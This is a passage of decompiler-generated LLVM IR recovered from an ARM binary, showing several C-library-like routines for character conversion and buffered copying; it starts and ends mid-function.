  store i32 %v3_11080, i32* %stack_var_-8, align 4
  %v10_11084 = icmp eq i32 %tmp, %arg2
  br i1 %v10_11084, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11080
  %v0_1108c1 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110a0

bb:                                               ; preds = %dec_label_pc_11080
  %v4_11088 = icmp eq i8* %arg1, null
  %v0_1108c = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_11088, label %dec_label_pc_110a0, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110a0:                               ; preds = %.thread, %bb
  %v1_110e0.ph = phi i32 [ %v0_1108c, %bb ], [ %v0_1108c1, %.thread ]
  %v2_110903.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_110a0 = icmp eq i8* %arg1, null
  store i32 %v2_110903.ph, i32* @ip, align 4
  br i1 %v3_110a0, label %.thread4, label %dec_label_pc_110d4

.thread4:                                         ; preds = %dec_label_pc_110a0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110f4
  %v0_110b8 = call i32 @function_cc08()
  store i32 %v0_110b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_110c4 = inttoptr i32 %v0_110b8 to i32*
  store i32 84, i32* %v2_110c4, align 4
  %v0_11130.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11130

dec_label_pc_110cc:                               ; preds = %dec_label_pc_11104
  %v3_11108 = zext i8 %v2_11108 to i32
  store i32 %v3_11108, i32* @lr, align 4
  br label %dec_label_pc_11124

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110a0
  store i32 %v2_110903.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110dc:                               ; preds = %bb27, %.thread4, %dec_label_pc_110d4
  %v1_110e020 = phi i32 [ %v0_1108c, %bb27 ], [ %v1_110e0.ph, %.thread4 ], [ %v1_110e0.ph, %dec_label_pc_110d4 ]
  %v2_1110414 = phi i32 [ %tmp, %bb27 ], [ %v2_110903.ph, %.thread4 ], [ %v2_110903.ph, %dec_label_pc_110d4 ]
  %v1_110dc = load i32, i32* @r3, align 4
  %v3_110dc = icmp uge i32 %v1_110e020, %v1_110dc
  %v1_110dc.v1_110e020 = select i1 %v3_110dc, i32 %v1_110dc, i32 %v1_110e020
  store i32 %v1_110dc.v1_110e020, i32* %r4.global-to-local, align 4
  %v1_110e8 = inttoptr i32 %arg2 to i32*
  %v2_110e8 = load i32, i32* %v1_110e8, align 4
  store i32 %v2_110e8, i32* @lr, align 4
  store i32 %v1_110dc.v1_110e020, i32* %r0.global-to-local, align 4
  %v2_1111c8 = icmp eq i32 %v1_110dc.v1_110e020, 0
  br i1 %v2_1111c8, label %dec_label_pc_11124, label %dec_label_pc_110f4

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110dc, %dec_label_pc_11114.dec_label_pc_110f4_crit_edge
  %v2_11104 = phi i32 [ %v2_11114, %dec_label_pc_11114.dec_label_pc_110f4_crit_edge ], [ %v2_1110414, %dec_label_pc_110dc ]
  %v0_110fc = phi i32 [ %v0_110f4.pre, %dec_label_pc_11114.dec_label_pc_110f4_crit_edge ], [ %v2_110e8, %dec_label_pc_110dc ]
  %v1_110f4 = inttoptr i32 %v0_110fc to i32*
  %v2_110f4 = load i32, i32* %v1_110f4, align 4
  %v1_110fc = add i32 %v0_110fc, 4
  store i32 %v1_110fc, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_110f4, 127
  br i1 %tmp36, label %dec_label_pc_110b8, label %dec_label_pc_11104

dec_label_pc_11104:                               ; preds = %dec_label_pc_110f4
  %v1_11104 = trunc i32 %v2_110f4 to i8
  %v3_11104 = inttoptr i32 %v2_11104 to i8*
  store i8 %v1_11104, i8* %v3_11104, align 1
  %v0_11108 = load i32, i32* @ip, align 4
  %v1_11108 = inttoptr i32 %v0_11108 to i8*
  %v2_11108 = load i8, i8* %v1_11108, align 1
  %v2_1110c = icmp eq i8 %v2_11108, 0
  br i1 %v2_1110c, label %dec_label_pc_110cc, label %dec_label_pc_11114

dec_label_pc_11114:                               ; preds = %dec_label_pc_11104
  %v1_11114 = load i32, i32* %r2.global-to-local, align 4
  %v2_11114 = add i32 %v1_11114, %v0_11108
  store i32 %v2_11114, i32* @ip, align 4
  %v0_11118 = load i32, i32* %r0.global-to-local, align 4
  %v1_11118 = add i32 %v0_11118, -1
  store i32 %v1_11118, i32* %r0.global-to-local, align 4
  %v2_1111c = icmp eq i32 %v1_11118, 0
  br i1 %v2_1111c, label %dec_label_pc_11124, label %dec_label_pc_11114.dec_label_pc_110f4_crit_edge

dec_label_pc_11114.dec_label_pc_110f4_crit_edge:  ; preds = %dec_label_pc_11114
  %v0_110f4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_110f4

dec_label_pc_11124:                               ; preds = %dec_label_pc_11114, %dec_label_pc_110dc, %dec_label_pc_110cc
  %v0_11124 = phi i32 [ %v0_11108, %dec_label_pc_110cc ], [ %v2_1110414, %dec_label_pc_110dc ], [ %v2_11114, %dec_label_pc_11114 ]
  %v1_11124 = load i32, i32* @sp, align 4
  %v9_11124 = icmp eq i32 %v0_11124, %v1_11124
  br i1 %v9_11124, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_11124
  %v1_11128 = load i32, i32* @lr, align 4
  store i32 %v1_11128, i32* %v1_110e8, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11124, %bb30
  %v0_1112c = load i32, i32* %r0.global-to-local, align 4
  %v1_1112c = load i32, i32* %r4.global-to-local, align 4
  %v2_1112c = sub i32 %v1_1112c, %v0_1112c
  store i32 %v2_1112c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_110b8, %bb31
  %v0_11130 = phi i32 [ %v0_11130.pre, %dec_label_pc_110b8 ], [ %v2_1112c, %bb31 ]
  store i32 %v0_11130, i32* %r0.global-to-local, align 4
  %v2_11138 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11138, i32* %r4.global-to-local, align 4
  ret i32 %v0_11130

; uselistorder directives
  uselistorder i32 %v0_11130, { 1, 0 }
  uselistorder i32 %v1_11118, { 1, 0 }
  uselistorder i32 %v2_11114, { 0, 2, 1 }
  uselistorder i32 %v2_110f4, { 1, 0 }
  uselistorder i32 %v2_1110414, { 1, 0 }
  uselistorder i32 %v1_110e0.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 3, 2, 0, 1 }
  uselistorder i32 127, { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11130, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_110f4, { 1, 0 }
  uselistorder label %dec_label_pc_110dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_110a0, { 1, 0 }
}

define i32 @function_1113c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1113c:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1113c = load i32, i32* @r4, align 4
  store i32 %v3_1113c, i32* %stack_var_-12, align 4
  %v6_1113c = load i32, i32* @r5, align 4
  %v9_1113c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1114c = call i32 @function_10c48(i32 %arg1, i32 3)
  %v7_11150 = icmp eq i32 %v2_1114c, -1
  br i1 %v7_11150, label %dec_label_pc_1113c.dec_label_pc_1116c_crit_edge, label %dec_label_pc_11164

dec_label_pc_1113c.dec_label_pc_1116c_crit_edge:  ; preds = %dec_label_pc_1113c
  br label %dec_label_pc_1116c

dec_label_pc_11164:                               ; preds = %dec_label_pc_1113c
  %v0_11158 = load i32, i32* @r4, align 4
  %v0_11154 = load i32, i32* %r5.global-to-local, align 4
  %v2_11164 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11164, i32* @r4, align 4
  store i32 %v6_1113c, i32* @r5, align 4
  store i32 %v9_1113c, i32* @lr, align 4
  %v4_11168 = inttoptr i32 %v0_11154 to i8*
  %v5_11168 = call i32 @function_d1dc(i32 %v2_1114c, i8* %v4_11168, i32 0, i32 %v0_11158)
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_1113c.dec_label_pc_1116c_crit_edge, %dec_label_pc_11164
  %v2_11170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11170, i32* @r4, align 4
  store i32 %v6_1113c, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1114c, { 1, 0 }
  uselistorder i32 %v6_1113c, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10c48, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
}

define i32 @function_11174(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11174:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_111882 = icmp eq i32 %arg3, 0
  store i1 %v2_111882, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_111882, label %dec_label_pc_11228, label %dec_label_pc_11194

dec_label_pc_11188thread-pre-split:               ; preds = %bb22
  %v3_111ac = load i32, i32* %r7.global-to-local, align 4
  %v5_111ac = add i32 %v3_111ac, %v4_111a0
  store i32 %v5_111ac, i32* %r7.global-to-local, align 4
  %v5_111b0 = sub i32 %v0_111a8, %v4_111a0
  store i32 %v5_111b0, i32* %r5.global-to-local, align 4
  %v2_11188 = icmp eq i32 %v5_111b0, 0
  store i1 %v2_11188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_111b0, i32* @r2, align 4
  br i1 %v2_11188, label %dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_11174, %dec_label_pc_11188thread-pre-split
  %v0_11198 = phi i32 [ %v5_111ac, %dec_label_pc_11188thread-pre-split ], [ %arg2, %dec_label_pc_11174 ]
  %v0_11194.in = phi i32 [ %v5_111b0, %dec_label_pc_11188thread-pre-split ], [ %arg3, %dec_label_pc_11174 ]
  %v0_11194 = icmp slt i32 %v0_11194.in, 0
  br i1 %v0_11194, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_11194
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_11194, %bb
  %v0_1119c = load i32, i32* @r4, align 4
  %v1_1119c = add i32 %v0_1119c, 4
  %v2_1119c = inttoptr i32 %v1_1119c to i32*
  %v3_1119c = load i32, i32* %v2_1119c, align 4
  store i32 %v3_1119c, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_11198 to i32*
  %v4_111a0 = call i32 @function_cba8(i32 %v3_1119c, i32* %tmp23)
  store i32 %v4_111a0, i32* %r0.global-to-local, align 4
  %v1_111a4 = icmp slt i32 %v4_111a0, 0
  %v2_111a4 = icmp eq i32 %v4_111a0, 0
  store i1 %v2_111a4, i1* %cpsr_z.global-to-local, align 1
  %v0_111a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_111a8, i32* %r6.global-to-local, align 4
  br i1 %v1_111a4, label %dec_label_pc_111b8, label %dec_label_pc_11188thread-pre-split

dec_label_pc_111b8:                               ; preds = %bb22
  %v0_111b8 = load i32, i32* @r4, align 4
  %v1_111b8 = inttoptr i32 %v0_111b8 to i32*
  %v2_111b8 = load i32, i32* %v1_111b8, align 4
  store i32 %v2_111b8, i32* %r3.global-to-local, align 4
  %v1_111bc = add i32 %v0_111b8, 8
  store i32 %v1_111bc, i32* %r0.global-to-local, align 4
  %v1_111c0 = inttoptr i32 %v1_111bc to i32*
  %v2_111c0 = load i32, i32* %v1_111c0, align 4
  store i32 %v2_111c0, i32* %r0.global-to-local, align 4
  %v3_111c0 = add i32 %v0_111b8, 12
  %v4_111c0 = inttoptr i32 %v3_111c0 to i32*
  %v5_111c0 = load i32, i32* %v4_111c0, align 4
  %v1_111c4 = or i32 %v2_111b8, 8
  store i32 %v1_111c4, i32* %r3.global-to-local, align 4
  %v3_111c8 = sdiv i32 %v2_111b8, 256
  %v2_111cc = sub i32 %v5_111c0, %v2_111c0
  store i32 %v2_111cc, i32* %r2.global-to-local, align 4
  %v9_111cc = icmp eq i32 %v5_111c0, %v2_111c0
  store i1 %v9_111cc, i1* %cpsr_z.global-to-local, align 1
  %v1_111d0 = trunc i32 %v3_111c8 to i8
  %v3_111d0 = add i32 %v0_111b8, 1
  %v4_111d0 = inttoptr i32 %v3_111d0 to i8*
  store i8 %v1_111d0, i8* %v4_111d0, align 1
  %v0_111d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_111d4 = trunc i32 %v0_111d4 to i8
  %v2_111d4 = load i32, i32* @r4, align 4
  %v3_111d4 = inttoptr i32 %v2_111d4 to i8*
  store i8 %v1_111d4, i8* %v3_111d4, align 1
  %v0_111d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_111d8, label %dec_label_pc_111b8.dec_label_pc_11224_crit_edge, label %dec_label_pc_111dc

dec_label_pc_111b8.dec_label_pc_11224_crit_edge:  ; preds = %dec_label_pc_111b8
  %v0_11224.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_111dc:                               ; preds = %dec_label_pc_111b8
  %v0_111dc = load i32, i32* %r2.global-to-local, align 4
  %v1_111dc = load i32, i32* %r5.global-to-local, align 4
  %v9_111dc = icmp eq i32 %v0_111dc, %v1_111dc
  store i1 %v9_111dc, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_111dc, %v1_111dc
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_111dc
  store i32 %v0_111dc, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_111dc, %bb24
  %v0_111e4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_111e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_11208
  %v2_111e8 = phi i32 [ %v2_111e8.pre, %.preheader ], [ %v1_1120c, %dec_label_pc_11208 ]
  %v0_111e4 = phi i32 [ %v0_111e4.pre, %.preheader ], [ %v1_111f4, %dec_label_pc_11208 ]
  %v1_111e4 = inttoptr i32 %v0_111e4 to i8*
  %v2_111e4 = load i8, i8* %v1_111e4, align 1
  %v3_111e4 = zext i8 %v2_111e4 to i32
  store i32 %v3_111e4, i32* %r3.global-to-local, align 4
  %v3_111e8 = inttoptr i32 %v2_111e8 to i8*
  store i8 %v2_111e4, i8* %v3_111e8, align 1
  %v0_111ec = load i32, i32* %r0.global-to-local, align 4
  %v1_111ec = inttoptr i32 %v0_111ec to i8*
  %v2_111ec = load i8, i8* %v1_111ec, align 1
  %v3_111ec = zext i8 %v2_111ec to i32
  store i32 %v3_111ec, i32* %r3.global-to-local, align 4
  %v7_111f0 = icmp eq i8 %v2_111ec, 10
  store i1 %v7_111f0, i1* %cpsr_z.global-to-local, align 1
  %v0_111f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_111f4 = add i32 %v0_111f4, 1
  store i32 %v1_111f4, i32* %r7.global-to-local, align 4
  br i1 %v7_111f0, label %dec_label_pc_111fc, label %dec_label_pc_11208

dec_label_pc_111fc:                               ; preds = %bb25
  %v0_111fc = load i32, i32* @r4, align 4
  %v1_111fc = add i32 %v0_111fc, 1
  %v2_111fc = inttoptr i32 %v1_111fc to i8*
  %v3_111fc = load i8, i8* %v2_111fc, align 1
  %v4_111fc = zext i8 %v3_111fc to i32
  store i32 %v4_111fc, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_111fc, 2
  %v2_11200 = icmp eq i8 %tmp30, 0
  store i1 %v2_11200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11200, label %dec_label_pc_11208, label %dec_label_pc_11214

dec_label_pc_11208:                               ; preds = %dec_label_pc_111fc, %bb25
  %v0_11208 = load i32, i32* %r6.global-to-local, align 4
  %v1_11208 = add i32 %v0_11208, -1
  store i32 %v1_11208, i32* %r6.global-to-local, align 4
  %v7_11208 = icmp eq i32 %v0_11208, 1
  store i1 %v7_11208, i1* %cpsr_z.global-to-local, align 1
  %v1_1120c = add i32 %v0_111ec, 1
  store i32 %v1_1120c, i32* %r0.global-to-local, align 4
  br i1 %v7_11208, label %dec_label_pc_11208.dec_label_pc_11214_crit_edge, label %bb25

dec_label_pc_11208.dec_label_pc_11214_crit_edge:  ; preds = %dec_label_pc_11208
  %v0_11214.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_111fc, %dec_label_pc_11208.dec_label_pc_11214_crit_edge
  %v0_11218 = phi i32 [ %v1_1120c, %dec_label_pc_11208.dec_label_pc_11214_crit_edge ], [ %v0_111ec, %dec_label_pc_111fc ]
  %v0_11214 = phi i32 [ %v0_11214.pre, %dec_label_pc_11208.dec_label_pc_11214_crit_edge ], [ %v0_111fc, %dec_label_pc_111fc ]
  %v1_11214 = add i32 %v0_11214, 8
  %v2_11214 = inttoptr i32 %v1_11214 to i32*
  %v3_11214 = load i32, i32* %v2_11214, align 4
  store i32 %v3_11214, i32* %r3.global-to-local, align 4
  %v2_11218 = add i32 %v0_11214, 16
  %v3_11218 = inttoptr i32 %v2_11218 to i32*
  store i32 %v0_11218, i32* %v3_11218, align 4
  %v0_1121c = load i32, i32* %r3.global-to-local, align 4
  %v1_1121c = load i32, i32* %r0.global-to-local, align 4
  %v2_1121c = sub i32 %v1_1121c, %v0_1121c
  store i32 %v2_1121c, i32* %r3.global-to-local, align 4
  %v1_11220 = load i32, i32* %r5.global-to-local, align 4
  %v2_11220 = sub i32 %v1_11220, %v2_1121c
  store i32 %v2_11220, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_111b8.dec_label_pc_11224_crit_edge, %dec_label_pc_11214
  %v0_11224 = phi i32 [ %v0_11224.pre, %dec_label_pc_111b8.dec_label_pc_11224_crit_edge ], [ %v2_11220, %dec_label_pc_11214 ]
  %v1_11224 = load i32, i32* %r8.global-to-local, align 4
  %v2_11224 = sub i32 %v1_11224, %v0_11224
  store i32 %v2_11224, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11228

dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge: ; preds = %dec_label_pc_11188thread-pre-split
  %v0_11228.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11228

dec_label_pc_11228:                               ; preds = %dec_label_pc_11174, %dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge, %dec_label_pc_11224
  %v0_11228 = phi i32 [ %v2_11224, %dec_label_pc_11224 ], [ %v0_11228.pre.pre, %dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge ], [ 0, %dec_label_pc_11174 ]
  store i32 %v0_11228, i32* %r0.global-to-local, align 4
  ret i32 %v0_11228

; uselistorder directives
  uselistorder i32 %v0_11228, { 1, 0 }
  uselistorder i32 %v0_11214, { 1, 0 }
  uselistorder i32 %v1_1120c, { 0, 2, 1 }
  uselistorder i32 %v0_11208, { 1, 0 }
  uselistorder i1 %v2_11200, { 1, 0 }
  uselistorder i32 %v1_111f4, { 1, 0 }
  uselistorder i32 %v0_111dc, { 1, 0, 2 }
  uselistorder i32 %v5_111c0, { 1, 0 }
  uselistorder i32 %v2_111c0, { 1, 0, 2 }
  uselistorder i32 %v0_111a8, { 1, 0 }
  uselistorder i32 %v4_111a0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_111b0, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder label %dec_label_pc_11228, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11224, { 1, 0 }
  uselistorder label %dec_label_pc_11214, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_11194, { 1, 0 }
}

define i32 @function_11230(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11230:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11230 = load i32, i32* @r4, align 4
  store i32 %v3_11230, i32* %stack_var_-20, align 4
  %v6_11230 = load i32, i32* @r5, align 4
  %v9_11230 = load i32, i32* @r6, align 4
  %v12_11230 = load i32, i32* @r7, align 4
  %v15_11230 = load i32, i32* @lr, align 4
  %v1_11234 = add i32 %arg3, 1
  %v2_11234 = inttoptr i32 %v1_11234 to i8*
  %v3_11234 = load i8, i8* %v2_11234, align 1
  %v4_11234 = zext i8 %v3_11234 to i32
  %v3_11238 = mul nuw nsw i32 %v4_11234, 256
  %v1_1123c = and i32 %v3_11238, 512
  store i32 %v1_1123c, i32* @r4, align 4
  %v2_1123c = icmp eq i32 %v1_1123c, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1123c, label %dec_label_pc_11250, label %dec_label_pc_1134c

dec_label_pc_11250:                               ; preds = %dec_label_pc_11230
  %v1_11250 = add i32 %arg3, 4
  %v2_11250 = inttoptr i32 %v1_11250 to i32*
  %v3_11250 = load i32, i32* %v2_11250, align 4
  %v1_11258 = add i32 %arg3, 16
  %v2_11258 = inttoptr i32 %v1_11258 to i32*
  %v3_11258 = load i32, i32* %v2_11258, align 4
  store i32 %v3_11258, i32* @r0, align 4
  %v1_1125c = add i32 %arg3, 12
  %v2_1125c = inttoptr i32 %v1_1125c to i32*
  %v3_1125c = load i32, i32* %v2_1125c, align 4
  %v4_11260 = icmp eq i32 %v3_11250, -2
  %v2_11264 = sub i32 %v3_1125c, %v3_11258
  br i1 %v4_11260, label %dec_label_pc_11264, label %dec_label_pc_1128c

dec_label_pc_11264:                               ; preds = %dec_label_pc_11250
  %v3_11268 = icmp ugt i32 %v2_11264, %arg2
  br i1 %v3_11268, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_11264
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_11264, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_11264, %dec_label_pc_11264 ]
  %v0_11270 = phi i32 [ %arg2, %bb ], [ %v2_11264, %dec_label_pc_11264 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_11270, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_11278 = call i32 @function_ec10()
  %v0_1127c = load i32, i32* @r5, align 4
  %v1_1127c = add i32 %v0_1127c, 16
  %v2_1127c = inttoptr i32 %v1_1127c to i32*
  %v3_1127c = load i32, i32* %v2_1127c, align 4
  %v1_11280 = load i32, i32* @r4, align 4
  %v2_11280 = add i32 %v1_11280, %v3_1127c
  store i32 %v2_11280, i32* %v2_1127c, align 4
  br label %dec_label_pc_11360

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11250
  %tmp = icmp ult i32 %v2_11264, %arg2
  br i1 %tmp, label %dec_label_pc_1132c, label %dec_label_pc_11298

dec_label_pc_11298:                               ; preds = %dec_label_pc_1128c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_112a0 = call i32 @function_ec10()
  %v0_112a4 = load i32, i32* @r5, align 4
  %v1_112a4 = add i32 %v0_112a4, 16
  %v2_112a4 = inttoptr i32 %v1_112a4 to i32*
  %v3_112a4 = load i32, i32* %v2_112a4, align 4
  %v1_112a8 = add i32 %v0_112a4, 1
  %v2_112a8 = inttoptr i32 %v1_112a8 to i8*
  %v3_112a8 = load i8, i8* %v2_112a8, align 1
  %v1_112ac = load i32, i32* @r6, align 4
  %v2_112ac = add i32 %v1_112ac, %v3_112a4
  %tmp17 = urem i8 %v3_112a8, 2
  %v2_112b0 = icmp eq i8 %tmp17, 0
  store i32 %v2_112ac, i32* %v2_112a4, align 4
  br i1 %v2_112b0, label %dec_label_pc_11360, label %dec_label_pc_112bc

dec_label_pc_112bc:                               ; preds = %dec_label_pc_11298
  %v0_112bc = load i32, i32* %r7.global-to-local, align 4
  %v0_112c4 = load i32, i32* @r6, align 4
  %v4_112c8 = call i32 @function_123b4(i32 %v0_112bc, i32 10, i32 %v0_112c4, i32 %v2_112ac)
  %v2_112cc = icmp eq i32 %v4_112c8, 0
  br i1 %v2_112cc, label %dec_label_pc_11360, label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_112bc
  %v0_112d4 = load i32, i32* @r5, align 4
  store i32 %v0_112d4, i32* @r0, align 4
  %v0_112d8 = call i32 @function_d60c()
  %v2_112dc = icmp eq i32 %v0_112d8, 0
  br i1 %v2_112dc, label %dec_label_pc_11360, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112d4
  %v0_112e4 = load i32, i32* @r6, align 4
  %v3_112e4 = icmp uge i32 %v0_112e4, %v0_112d8
  %v0_112d8.v0_112e4 = select i1 %v3_112e4, i32 %v0_112d8, i32 %v0_112e4
  store i32 %v0_112d8.v0_112e4, i32* @r4, align 4
  %v2_112f0 = sub i32 %v0_112e4, %v0_112d8.v0_112e4
  %v0_112f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_112f4 = add i32 %v0_112f4, %v2_112f0
  store i32 %v2_112f4, i32* %r7.global-to-local, align 4
  store i32 %v0_112d8.v0_112e4, i32* @r2, align 4
  %v4_11304 = call i32 @function_122a0(i32 %v2_112f4, i32 10, i32 %v0_112d8.v0_112e4, i32 %v2_112f0)
  %v2_11308 = icmp eq i32 %v4_11304, 0
  br i1 %v2_11308, label %dec_label_pc_11360, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %dec_label_pc_112e4
  %v0_11310 = load i32, i32* @r5, align 4
  %v1_11310 = add i32 %v0_11310, 16
  %v2_11310 = inttoptr i32 %v1_11310 to i32*
  %v3_11310 = load i32, i32* %v2_11310, align 4
  %v0_11314 = load i32, i32* %r7.global-to-local, align 4
  %v1_11314 = load i32, i32* @r4, align 4
  %v2_11314 = sub i32 %v0_11314, %v4_11304
  %v2_11318 = add i32 %v2_11314, %v1_11314
  %v2_1131c = sub i32 %v3_11310, %v2_11318
  %v1_11320 = load i32, i32* @r6, align 4
  %v2_11320 = sub i32 %v1_11320, %v2_11318
  store i32 %v2_11320, i32* @r6, align 4
  store i32 %v2_1131c, i32* %v2_11310, align 4
  br label %dec_label_pc_11360

dec_label_pc_1132c:                               ; preds = %dec_label_pc_1128c
  %v1_1132c = add i32 %arg3, 8
  %v2_1132c = inttoptr i32 %v1_1132c to i32*
  %v3_1132c = load i32, i32* %v2_1132c, align 4
  %v9_11330 = icmp eq i32 %v3_11258, %v3_1132c
  br i1 %v9_11330, label %dec_label_pc_1134c, label %dec_label_pc_11338

dec_label_pc_11338:                               ; preds = %dec_label_pc_1132c
  store i32 %arg3, i32* @r0, align 4
  %v0_1133c = call i32 @function_d60c()
  %v2_11340 = icmp eq i32 %v0_1133c, 0
  br i1 %v2_11340, label %dec_label_pc_11338.dec_label_pc_1134c_crit_edge, label %bb13

dec_label_pc_11338.dec_label_pc_1134c_crit_edge:  ; preds = %dec_label_pc_11338
  %v0_11354.pre = load i32, i32* @r6, align 4
  %v0_1134c.pre = load i32, i32* @r5, align 4
  %v0_11350.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_11358.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_1134c

bb13:                                             ; preds = %dec_label_pc_11338
  %v1_11344 = load i32, i32* @r4, align 4
  store i32 %v1_11344, i32* @r6, align 4
  br label %dec_label_pc_11360

